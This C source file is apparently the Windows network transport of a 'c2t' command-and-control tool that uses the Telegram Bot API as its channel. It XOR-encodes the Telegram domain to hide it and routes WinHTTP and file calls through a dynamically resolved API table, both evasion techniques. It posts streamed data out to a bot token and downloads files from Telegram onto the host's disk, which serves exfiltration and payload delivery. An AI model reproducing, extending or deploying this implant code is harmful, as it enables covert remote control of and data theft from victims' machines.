/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "../config/config.h"
#include "../logging/logging.h"
#include "c2t_version.h"
#include "telegram_platform.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../win32/win32_api.h"

static HINTERNET c2t_WinHttpOpen(LPCWSTR pszAgent, DWORD dwAccessType,
                                 LPCWSTR pszProxy, LPCWSTR pszProxyBypass,
                                 DWORD dwFlags) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpOpen)
    return g_c2t_win32.WinHttpOpen(pszAgent, dwAccessType, pszProxy,
                                   pszProxyBypass, dwFlags);
  return NULL;
}
static HINTERNET c2t_WinHttpConnect(HINTERNET hSession, LPCWSTR pswzServerName,
                                    INTERNET_PORT nServerPort, DWORD dwReserved) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpConnect)
    return g_c2t_win32.WinHttpConnect(hSession, pswzServerName, nServerPort,
                                     dwReserved);
  return NULL;
}
static HINTERNET c2t_WinHttpOpenRequest(HINTERNET hConnect, LPCWSTR pwszVerb,
                                        LPCWSTR pwszObjectName,
                                        LPCWSTR pwszVersion, LPCWSTR pwszReferrer,
                                        LPCWSTR *ppwszAcceptTypes,
                                        DWORD dwFlags) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpOpenRequest)
    return g_c2t_win32.WinHttpOpenRequest(hConnect, pwszVerb, pwszObjectName,
                                          pwszVersion, pwszReferrer,
                                          ppwszAcceptTypes, dwFlags);
  return NULL;
}
static BOOL c2t_WinHttpSendRequest(HINTERNET hRequest, LPCWSTR lpszHeaders,
                                   DWORD dwHeadersLength, LPVOID lpOptional,
                                   DWORD dwOptionalLength, DWORD dwTotalLength,
                                   DWORD_PTR dwContext) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpSendRequest)
    return g_c2t_win32.WinHttpSendRequest(hRequest, lpszHeaders, dwHeadersLength,
                                          lpOptional, dwOptionalLength,
                                          dwTotalLength, dwContext);
  return FALSE;
}
static BOOL c2t_WinHttpReceiveResponse(HINTERNET hRequest, LPVOID lpReserved) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpReceiveResponse)
    return g_c2t_win32.WinHttpReceiveResponse(hRequest, lpReserved);
  return FALSE;
}
static BOOL c2t_WinHttpQueryDataAvailable(HINTERNET hRequest,
                                           LPDWORD lpdwNumberOfBytesAvailable) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpQueryDataAvailable)
    return g_c2t_win32.WinHttpQueryDataAvailable(hRequest,
                                                 lpdwNumberOfBytesAvailable);
  return FALSE;
}
static BOOL c2t_WinHttpReadData(HINTERNET hRequest, LPVOID lpBuffer,
                                DWORD dwNumberOfBytesToRead,
                                LPDWORD lpdwNumberOfBytesRead) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpReadData)
    return g_c2t_win32.WinHttpReadData(hRequest, lpBuffer, dwNumberOfBytesToRead,
                                       lpdwNumberOfBytesRead);
  return FALSE;
}
static BOOL c2t_WinHttpWriteData(HINTERNET hRequest, LPCVOID lpBuffer,
                                 DWORD dwNumberOfBytesToWrite,
                                 LPDWORD lpdwNumberOfBytesWritten) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpWriteData)
    return g_c2t_win32.WinHttpWriteData(
        hRequest, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten);
  return FALSE;
}
static BOOL c2t_WinHttpQueryHeaders(HINTERNET hRequest, DWORD dwInfoLevel,
                                    LPCWSTR pwszName, LPVOID lpBuffer,
                                    LPDWORD lpdwBufferLength,
                                    LPDWORD lpdwIndex) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpQueryHeaders)
    return g_c2t_win32.WinHttpQueryHeaders(hRequest, dwInfoLevel, pwszName,
                                           lpBuffer, lpdwBufferLength,
                                           lpdwIndex);
  return FALSE;
}
static BOOL c2t_WinHttpCloseHandle(HINTERNET hInternet) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpCloseHandle)
    return g_c2t_win32.WinHttpCloseHandle(hInternet);
  return FALSE;
}
static BOOL c2t_WinHttpSetTimeouts(HINTERNET hInternet, int nResolveTimeout,
                                   int nConnectTimeout, int nSendTimeout,
                                   int nReceiveTimeout) {
  c2t_win32_api_init();
  if (g_c2t_win32.WinHttpSetTimeouts)
    return g_c2t_win32.WinHttpSetTimeouts(hInternet, nResolveTimeout,
                                          nConnectTimeout, nSendTimeout,
                                          nReceiveTimeout);
  return FALSE;
}
static int c2t_MultiByteToWideChar(UINT CodePage, DWORD dwFlags,
                                   LPCCH lpMultiByteStr, int cbMultiByte,
                                   LPWSTR lpWideCharStr, int cchWideChar) {
  c2t_win32_api_init();
  if (g_c2t_win32.MultiByteToWideChar)
    return g_c2t_win32.MultiByteToWideChar(CodePage, dwFlags, lpMultiByteStr,
                                           cbMultiByte, lpWideCharStr,
                                           cchWideChar);
  return 0;
}

static DWORD c2t_GetLastError(VOID) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetLastError)
    return g_c2t_win32.GetLastError();
  return 0;
}
static HANDLE c2t_CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess,
                              DWORD dwShareMode,
                              LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                              DWORD dwCreationDisposition,
                              DWORD dwFlagsAndAttributes,
                              HANDLE hTemplateFile) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateFileW)
    return g_c2t_win32.CreateFileW(
        lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
  return INVALID_HANDLE_VALUE;
}
static BOOL c2t_WriteFile(HANDLE hFile, LPCVOID lpBuffer,
                           DWORD nNumberOfBytesToWrite,
                           LPDWORD lpNumberOfBytesWritten,
                           LPOVERLAPPED lpOverlapped) {
  c2t_win32_api_init();
  if (g_c2t_win32.WriteFile)
    return g_c2t_win32.WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite,
                                 lpNumberOfBytesWritten, lpOverlapped);
  return FALSE;
}
static BOOL c2t_DeleteFileA(LPCSTR lpFileName) {
  c2t_win32_api_init();
  if (g_c2t_win32.DeleteFileA)
    return g_c2t_win32.DeleteFileA(lpFileName);
  return FALSE;
}
static BOOL c2t_CloseHandle(HANDLE hObject) {
  c2t_win32_api_init();
  if (g_c2t_win32.CloseHandle)
    return g_c2t_win32.CloseHandle(hObject);
  return FALSE;
}

#define WinHttpOpen c2t_WinHttpOpen
#define WinHttpConnect c2t_WinHttpConnect
#define WinHttpOpenRequest c2t_WinHttpOpenRequest
#define WinHttpSendRequest c2t_WinHttpSendRequest
#define WinHttpReceiveResponse c2t_WinHttpReceiveResponse
#define WinHttpQueryDataAvailable c2t_WinHttpQueryDataAvailable
#define WinHttpReadData c2t_WinHttpReadData
#define WinHttpWriteData c2t_WinHttpWriteData
#define WinHttpQueryHeaders c2t_WinHttpQueryHeaders
#define WinHttpCloseHandle c2t_WinHttpCloseHandle
#define WinHttpSetTimeouts c2t_WinHttpSetTimeouts
#define MultiByteToWideChar c2t_MultiByteToWideChar
#define GetLastError c2t_GetLastError
#define CreateFileW c2t_CreateFileW
#define WriteFile c2t_WriteFile
#define DeleteFileA c2t_DeleteFileA
#define CloseHandle c2t_CloseHandle

static HINTERNET session;
static HINTERNET connection;

#define TELEGRAM_RESPONSE_CAPACITY 1024

static void read_error_response(HINTERNET request,
                                char response[TELEGRAM_RESPONSE_CAPACITY]) {
  DWORD available = 0;
  DWORD read = 0;
  if (!WinHttpQueryDataAvailable(request, &available))
    return;
  if (available >= TELEGRAM_RESPONSE_CAPACITY)
    available = TELEGRAM_RESPONSE_CAPACITY - 1;
  if (available && !WinHttpReadData(request, response, available, &read))
    return;
  response[read] = '\0';
  for (DWORD index = 0; index < read; ++index) {
    unsigned char character = (unsigned char)response[index];
    if (character < 0x20 || character == 0x7f)
      response[index] = ' ';
  }
}

int telegram_http_init(void) {
  const c2t_config_t *cfg = c2t_config_get();
  if (cfg && cfg->proxy && *cfg->proxy) {
    int proxy_length = MultiByteToWideChar(CP_UTF8, 0, cfg->proxy, -1, NULL, 0);
    wchar_t *wide_proxy = proxy_length > 0
                              ? malloc((size_t)proxy_length * sizeof(wchar_t))
                              : NULL;
    if (wide_proxy) {
      MultiByteToWideChar(CP_UTF8, 0, cfg->proxy, -1, wide_proxy, proxy_length);
      session =
          WinHttpOpen(C2T_USER_AGENT_WIDE, WINHTTP_ACCESS_TYPE_NAMED_PROXY,
                      wide_proxy, WINHTTP_NO_PROXY_BYPASS, 0);
      free(wide_proxy);
    } else {
      session =
          WinHttpOpen(C2T_USER_AGENT_WIDE, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    }
  } else {
    session =
        WinHttpOpen(C2T_USER_AGENT_WIDE, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  }
  if (session) {
    static const unsigned char enc_tg_domain[] = {
        59, 42, 51, 116, 46, 63, 54, 63, 61, 40, 59, 55, 116, 53, 40, 61};
    wchar_t tg_domain[20] = {};
    for (size_t i = 0; i < sizeof(enc_tg_domain); ++i) {
      tg_domain[i] = (wchar_t)(enc_tg_domain[i] ^ 0x5A);
    }
    connection =
        WinHttpConnect(session, tg_domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
  }
  if (!session || !connection) {
    c2t_log_error("https", "Unable to initialize WinHTTP (error %lu)",
                  (unsigned long)GetLastError());
    telegram_http_cleanup();
    return 0;
  }
  c2t_log_debug("https", "WinHTTP transport ready");
  return 1;
}

int telegram_http_post(const char *token, const char *method,
                       const char *content_type, const void *body,
                       size_t body_length) {
  c2t_log_debug("https", "POST %s (%llu-byte body, content-type=%s)", method,
                (unsigned long long)body_length, content_type);
  int token_length = MultiByteToWideChar(CP_UTF8, 0, token, -1, NULL, 0);
  if (token_length <= 0 || token_length > 257 || body_length > UINT32_MAX)
    return 0;

  wchar_t path[300];
  static const wchar_t prefix[] = L"/bot";
  memcpy(path, prefix, sizeof(prefix) - sizeof(wchar_t));
  wchar_t *position = path + (sizeof(prefix) / sizeof(wchar_t) - 1);
  if (!MultiByteToWideChar(CP_UTF8, 0, token, -1, position,
                           (int)(300 - (position - path))))
    return 0;
  position += token_length - 1;
  *position++ = L'/';
  int method_length = MultiByteToWideChar(CP_UTF8, 0, method, -1, position,
                                          (int)(300 - (position - path)));
  if (method_length <= 0)
    return 0;

  HINTERNET request =
      WinHttpOpenRequest(connection, L"POST", path, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!request)
    return 0;

  int header_size = MultiByteToWideChar(CP_UTF8, 0, content_type, -1, NULL, 0);
  wchar_t *header = header_size > 0
                        ? malloc(((size_t)header_size + 14) * sizeof(wchar_t))
                        : NULL;
  if (!header) {
    WinHttpCloseHandle(request);
    return 0;
  }
  memcpy(header, L"Content-Type: ", 14 * sizeof(wchar_t));
  MultiByteToWideChar(CP_UTF8, 0, content_type, -1, header + 14, header_size);
  BOOL success = WinHttpSendRequest(request, header, (DWORD)-1L, (void *)body,
                                    (DWORD)body_length, (DWORD)body_length, 0);
  free(header);
  if (success)
    success = WinHttpReceiveResponse(request, NULL);

  DWORD status = 0;
  DWORD status_size = sizeof(status);
  if (success)
    success = WinHttpQueryHeaders(
        request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
        WINHTTP_NO_HEADER_INDEX);

  DWORD request_error = success ? ERROR_SUCCESS : GetLastError();
  if (!success || status < 200 || status >= 300) {
    char response[TELEGRAM_RESPONSE_CAPACITY] = {0};
    if (success)
      read_error_response(request, response);
    if (*response)
      c2t_log_error("https",
                    "Telegram request failed: method=%s, "
                    "HTTP=%lu, winhttp_error=%lu, response=%s",
                    method, (unsigned long)status, (unsigned long)request_error,
                    response);
    else
      c2t_log_error("https",
                    "Telegram request failed: method=%s, "
                    "HTTP=%lu, winhttp_error=%lu",
                    method, (unsigned long)status,
                    (unsigned long)request_error);
    WinHttpCloseHandle(request);
    return 0;
  }
  WinHttpCloseHandle(request);
  c2t_log_debug("https", "Telegram request completed: method=%s, HTTP=%lu",
                method, (unsigned long)status);
  return 1;
}

int telegram_http_post_stream(const char *token, const char *method,
                              const char *content_type, c2t_stream_t *stream) {
  if (!token || !method || !content_type || !stream || !stream->read)
    return 0;

  c2t_log_debug("https", "POST stream %s (%llu-byte stream, content-type=%s)",
                method, (unsigned long long)stream->total_size, content_type);
  int token_length = MultiByteToWideChar(CP_UTF8, 0, token, -1, NULL, 0);
  if (token_length <= 0 || token_length > 257 ||
      stream->total_size > UINT32_MAX)
    return 0;

  wchar_t path[300];
  static const wchar_t prefix[] = L"/bot";
  memcpy(path, prefix, sizeof(prefix) - sizeof(wchar_t));
  wchar_t *position = path + (sizeof(prefix) / sizeof(wchar_t) - 1);
  if (!MultiByteToWideChar(CP_UTF8, 0, token, -1, position,
                           (int)(300 - (position - path))))
    return 0;
  position += token_length - 1;
  *position++ = L'/';
  int method_length = MultiByteToWideChar(CP_UTF8, 0, method, -1, position,
                                          (int)(300 - (position - path)));
  if (method_length <= 0)
    return 0;

  HINTERNET request =
      WinHttpOpenRequest(connection, L"POST", path, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!request)
    return 0;

  int header_size = MultiByteToWideChar(CP_UTF8, 0, content_type, -1, NULL, 0);
  wchar_t *header = header_size > 0
                        ? malloc(((size_t)header_size + 14) * sizeof(wchar_t))
                        : NULL;
  if (!header) {
    WinHttpCloseHandle(request);
    return 0;
  }
  memcpy(header, L"Content-Type: ", 14 * sizeof(wchar_t));
  MultiByteToWideChar(CP_UTF8, 0, content_type, -1, header + 14, header_size);

  BOOL success =
      WinHttpSendRequest(request, header, (DWORD)-1L, WINHTTP_NO_REQUEST_DATA,
                         0, (DWORD)stream->total_size, 0);
  free(header);

  if (success && stream->total_size > 0) {
    unsigned char chunk_buf[16384];
    c2t_secure_lock(chunk_buf, sizeof(chunk_buf));
    size_t total_sent = 0;
    while (success && total_sent < stream->total_size) {
      size_t read_bytes =
          stream->read(stream->user_data, chunk_buf, sizeof(chunk_buf));
      if (read_bytes == 0) {
        success = FALSE;
        break;
      }
      DWORD written = 0;
      if (!WinHttpWriteData(request, chunk_buf, (DWORD)read_bytes, &written) ||
          written != read_bytes) {
        success = FALSE;
      }
      c2t_secure_zero(chunk_buf, sizeof(chunk_buf));
      total_sent += read_bytes;
    }
    c2t_secure_unlock(chunk_buf, sizeof(chunk_buf));
  }

  if (success)
    success = WinHttpReceiveResponse(request, NULL);

  DWORD status = 0;
  DWORD status_size = sizeof(status);
  if (success)
    success = WinHttpQueryHeaders(
        request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
        WINHTTP_NO_HEADER_INDEX);

  DWORD request_error = success ? ERROR_SUCCESS : GetLastError();
  if (!success || status < 200 || status >= 300) {
    char response[TELEGRAM_RESPONSE_CAPACITY] = {0};
    if (success)
      read_error_response(request, response);
    if (*response)
      c2t_log_error("https",
                    "Telegram stream request failed: method=%s, "
                    "HTTP=%lu, winhttp_error=%lu, response=%s",
                    method, (unsigned long)status, (unsigned long)request_error,
                    response);
    else
      c2t_log_error("https",
                    "Telegram stream request failed: method=%s, "
                    "HTTP=%lu, winhttp_error=%lu",
                    method, (unsigned long)status,
                    (unsigned long)request_error);
    WinHttpCloseHandle(request);
    return 0;
  }
  WinHttpCloseHandle(request);
  c2t_log_debug("https",
                "Telegram stream request completed: method=%s, HTTP=%lu",
                method, (unsigned long)status);
  return 1;
}

int telegram_http_get(const char *token, const char *method_and_query,
                      char *response_out, size_t response_capacity) {
  if (!response_out || response_capacity == 0)
    return 0;
  response_out[0] = '\0';
  c2t_log_debug("https", "GET %s", method_and_query);

  int token_length = MultiByteToWideChar(CP_UTF8, 0, token, -1, NULL, 0);
  if (token_length <= 0 || token_length > 257)
    return 0;

  wchar_t path[512];
  static const wchar_t prefix[] = L"/bot";
  memcpy(path, prefix, sizeof(prefix) - sizeof(wchar_t));
  wchar_t *position = path + (sizeof(prefix) / sizeof(wchar_t) - 1);
  if (!MultiByteToWideChar(CP_UTF8, 0, token, -1, position,
                           (int)(512 - (position - path))))
    return 0;
  position += token_length - 1;
  *position++ = L'/';
  int method_length =
      MultiByteToWideChar(CP_UTF8, 0, method_and_query, -1, position,
                          (int)(512 - (position - path)));
  if (method_length <= 0)
    return 0;

  HINTERNET request =
      WinHttpOpenRequest(connection, L"GET", path, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!request)
    return 0;

  WinHttpSetTimeouts(request, 10000, 10000, 10000, 35000);

  BOOL success = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
  if (success)
    success = WinHttpReceiveResponse(request, NULL);

  DWORD status = 0;
  DWORD status_size = sizeof(status);
  if (success)
    success = WinHttpQueryHeaders(
        request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
        WINHTTP_NO_HEADER_INDEX);

  if (!success || status < 200 || status >= 300) {
    WinHttpCloseHandle(request);
    return 0;
  }

  DWORD available = 0;
  DWORD total_read = 0;
  while (WinHttpQueryDataAvailable(request, &available) && available > 0) {
    DWORD read = 0;
    if (total_read + available >= response_capacity)
      available = (DWORD)(response_capacity - 1 - total_read);
    if (available == 0)
      break;
    if (!WinHttpReadData(request, response_out + total_read, available, &read))
      break;
    total_read += read;
  }
  response_out[total_read] = '\0';
  WinHttpCloseHandle(request);
  return 1;
}

int telegram_http_download_file(const char *token,
                                const char *telegram_file_path,
                                const char *dest_path, size_t max_bytes,
                                size_t *downloaded_bytes) {
  if (!token || !telegram_file_path || !dest_path)
    return 0;

  if (downloaded_bytes)
    *downloaded_bytes = 0;

  if (!connection) {
    c2t_log_error(
        "https",
        "Cannot perform WinHTTP download: connection handle not initialized");
    return 0;
  }

  int dest_wlen = MultiByteToWideChar(CP_UTF8, 0, dest_path, -1, NULL, 0);
  if (dest_wlen <= 0)
    return 0;
  wchar_t *wide_dest = malloc((size_t)dest_wlen * sizeof(wchar_t));
  if (!wide_dest)
    return 0;
  MultiByteToWideChar(CP_UTF8, 0, dest_path, -1, wide_dest, dest_wlen);

  HANDLE hFile = CreateFileW(wide_dest, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    c2t_log_error("https", "Cannot open destination file '%s' for writing: %lu",
                  dest_path, (unsigned long)GetLastError());
    free(wide_dest);
    return 0;
  }

  int token_length = MultiByteToWideChar(CP_UTF8, 0, token, -1, NULL, 0);
  if (token_length <= 0 || token_length > 257) {
    CloseHandle(hFile);
    char dest_ansi[512] = {};
    WideCharToMultiByte(CP_ACP, 0, wide_dest, -1, dest_ansi, sizeof(dest_ansi), NULL, NULL);
    DeleteFileA(dest_ansi);
    free(wide_dest);
    return 0;
  }

  wchar_t path[600];
  static const wchar_t prefix[] = L"/file/bot";
  memcpy(path, prefix, sizeof(prefix) - sizeof(wchar_t));
  wchar_t *position = path + (sizeof(prefix) / sizeof(wchar_t) - 1);
  if (!MultiByteToWideChar(CP_UTF8, 0, token, -1, position,
                           (int)(600 - (position - path)))) {
    CloseHandle(hFile);
    char dest_ansi[512] = {};
    WideCharToMultiByte(CP_ACP, 0, wide_dest, -1, dest_ansi, sizeof(dest_ansi), NULL, NULL);
    DeleteFileA(dest_ansi);
    free(wide_dest);
    return 0;
  }
  position += token_length - 1;
  *position++ = L'/';
  int file_path_len =
      MultiByteToWideChar(CP_UTF8, 0, telegram_file_path, -1, position,
                          (int)(600 - (position - path)));
  if (file_path_len <= 0) {
    CloseHandle(hFile);
    char dest_ansi[512] = {};
    WideCharToMultiByte(CP_ACP, 0, wide_dest, -1, dest_ansi, sizeof(dest_ansi), NULL, NULL);
    DeleteFileA(dest_ansi);
    free(wide_dest);
    return 0;
  }

  HINTERNET request =
      WinHttpOpenRequest(connection, L"GET", path, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!request) {
    CloseHandle(hFile);
    char dest_ansi[512] = {};
    WideCharToMultiByte(CP_ACP, 0, wide_dest, -1, dest_ansi, sizeof(dest_ansi), NULL, NULL);
    DeleteFileA(dest_ansi);
    free(wide_dest);
    return 0;
  }

  WinHttpSetTimeouts(request, 10000, 10000, 10000, 120000);

  BOOL success = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
  if (success)
    success = WinHttpReceiveResponse(request, NULL);

  DWORD status = 0;
  DWORD status_size = sizeof(status);
  if (success)
    success = WinHttpQueryHeaders(
        request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
        WINHTTP_NO_HEADER_INDEX);

  if (!success || status < 200 || status >= 300) {
    WinHttpCloseHandle(request);
    CloseHandle(hFile);
    char dest_ansi[512] = {};
    WideCharToMultiByte(CP_ACP, 0, wide_dest, -1, dest_ansi, sizeof(dest_ansi), NULL, NULL);
    DeleteFileA(dest_ansi);
    free(wide_dest);
    return 0;
  }

  DWORD available = 0;
  size_t total_written = 0;
  char buffer[16384];
  int limit_exceeded = 0;

  while (WinHttpQueryDataAvailable(request, &available) && available > 0) {
    DWORD to_read =
        available > sizeof(buffer) ? (DWORD)sizeof(buffer) : available;
    DWORD read = 0;
    if (!WinHttpReadData(request, buffer, to_read, &read) || read == 0)
      break;
    if (max_bytes > 0 && total_written + read > max_bytes) {
      limit_exceeded = 1;
      break;
    }
    DWORD written = 0;
    if (!WriteFile(hFile, buffer, read, &written, NULL) || written != read)
      break;
    total_written += written;
  }

  WinHttpCloseHandle(request);
  CloseHandle(hFile);

  if (limit_exceeded) {
    c2t_log_error("https",
                  "Telegram download aborted: file exceeds maximum allowed "
                  "limit of %llu bytes",
                  (unsigned long long)max_bytes);
    char dest_ansi[512] = {};
    WideCharToMultiByte(CP_ACP, 0, wide_dest, -1, dest_ansi, sizeof(dest_ansi), NULL, NULL);
    DeleteFileA(dest_ansi);
    free(wide_dest);
    return 0;
  }

  free(wide_dest);

  if (downloaded_bytes)
    *downloaded_bytes = total_written;

  c2t_log_debug(
      "https", "Telegram file download completed: %s -> %s (%llu bytes)",
      telegram_file_path, dest_path, (unsigned long long)total_written);
  return 1;
}

void telegram_http_thread_cleanup(void) {}

void telegram_http_cleanup(void) {
  c2t_log_debug("https", "Cleaning up WinHTTP transport");
  if (connection)
    WinHttpCloseHandle(connection);
  if (session)
    WinHttpCloseHandle(session);
  connection = NULL;
  session = NULL;
}
